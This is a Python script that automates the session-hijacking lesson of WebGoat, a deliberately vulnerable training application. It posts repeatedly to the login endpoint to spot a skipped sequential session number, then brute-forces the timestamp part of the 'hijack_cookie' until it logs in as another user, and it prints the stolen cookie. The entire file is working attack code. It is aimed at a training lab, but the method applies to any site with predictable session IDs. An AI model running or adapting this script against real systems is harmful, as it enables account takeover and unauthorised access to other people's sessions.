#!/usr/bin/env python

import argparse
import sys
import json
import requests


'''
        To run the script, run it from the terminal and provide the URLs as arguments separated by space. Here is an example:

        With dash symbol letters:

        python session_hijack.py -a "http://www.webgoat.local:8080/WebGoat/HijackSession/login" -c "WI9O7ZgML5AJNoTkOHA9pXoaafgP5jzrrRPtpo0g"

        With double dash words:

        python session_hijack.py --attack_url "http://www.webgoat.local:8080/WebGoat/HijackSession/login" \
            --site_cookie "WI9O7ZgML5AJNoTkOHA9pXoaafgP5jzrrRPtpo0g"
'''

# Define SessionHijack class for handling session hijacking process


class SessionHijack:
    def __init__(self, attack_url, webgoat_cookie):
        self.attack_url = attack_url
        self.login_session = webgoat_cookie
        self.headers = {
            "user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0"}
        self.open_session_number = None
        self.open_session_previous_login = None
        self.open_session_next_login = None

    def find_open_session(self):
        # Function to find an open session

        print("[*] Attempting to find open session")
        session_found = False
        previous_session_cookie = None
        cookies = dict(
            JSESSIONID=self.login_session,
            path="/WebGoat",
            secure="false"
        )
        data = dict(
            username="",
            password=""
        )

        while not session_found:
            response = requests.post(
                self.attack_url, headers=self.headers, cookies=cookies, data=data)
            session_cookie = response.cookies.get_dict()["hijack_cookie"]
            session_number = int(session_cookie.split("-")[0])
            print("[-] Checking session: {}".format(session_cookie))

            if previous_session_cookie is None:
                previous_session_cookie = session_cookie
            elif (session_number - int(previous_session_cookie.split("-")[0])) != 1:
                print("[+] Found open session: {}".format(session_number - 1))
                self.open_session_number = session_number - 1
                self.open_session_previous_login = int(
                    previous_session_cookie.split("-")[1])
                self.open_session_next_login = int(
                    session_cookie.split("-")[1])
                session_found = True
            else:
                previous_session_cookie = session_cookie

    def brute_force_cookie(self):
        # Function to perform brute-force on the session's login time

        print("[*] Attempting to brute-force session login time for\n[*]\t session: {} between {} and {}".format(
            self.open_session_number,
            self.open_session_previous_login,
            self.open_session_next_login
        ))
        attemps = 0
        logged_in = False
        login_time_guess = self.open_session_next_login

        while not logged_in and login_time_guess > self.open_session_previous_login - 1:
            login_time_guess -= 1
            attemps += 1
            reformed_id_guess = "{}-{}".format(
                self.open_session_number, login_time_guess)
            params = dict(
                username="",
                password="",
                hijack_cookie=reformed_id_guess
            )
            cookies = dict(
                hijack_cookie=reformed_id_guess,
                JSESSIONID=self.login_session,
                path="/WebGoat",
                secure="false"
            )

            response = requests.post(
                self.attack_url, params=params, headers=self.headers, cookies=cookies)
            lesson_completed = json.loads(response.text)["lessonCompleted"]
            print("[*] Attemp {} | Cookie: {} | response: {}".format(attemps,
                  reformed_id_guess, lesson_completed))

            if response.status_code == 200:
                feedback = json.loads(response.text)["feedback"]
                if lesson_completed:
                    print("[+] SUCCESSFUL LOGIN! Feedback: {}".format(feedback))
                    print("[+] Cookie Value: {}".format(reformed_id_guess))
                    logged_in = True
                    sys.exit(0)

        if not logged_in:
            print("[*] Failed to find session login")


def main(attack_url, site_cookie):
    # Create SessionHijack instance and start the process

    session_hijack = SessionHijack(attack_url, site_cookie)
    session_hijack.find_open_session()
    session_hijack.brute_force_cookie()


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description='Script for session hijacking')
    parser.add_argument('-a', '--attack_url',
                        help='URL of the target', required=True)
    parser.add_argument('-c', '--site_cookie',
                        help='Site cookie value', required=True)

    args = parser.parse_args()

    main(args.attack_url, args.site_cookie)
